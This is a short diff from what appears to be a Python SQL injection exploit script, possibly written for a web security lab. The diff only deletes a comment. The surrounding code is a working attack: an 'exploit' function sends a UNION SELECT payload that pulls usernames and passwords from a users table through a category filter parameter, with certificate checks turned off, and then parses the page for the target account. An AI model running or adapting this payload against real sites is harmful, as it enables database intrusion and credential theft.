@@ -10,7 +10,6 @@ def exploit(url, username):
     payload = "'+union+select+username,password+from+users--+-"
     uri = "filter?category="
     request = requests.get(url + uri + payload, verify=False, proxies=proxies)
-    # incomplete: for-loop
     if username in request.text:
         soup = BeautifulSoup(request.text, 'html.parser')
         if soup.body:
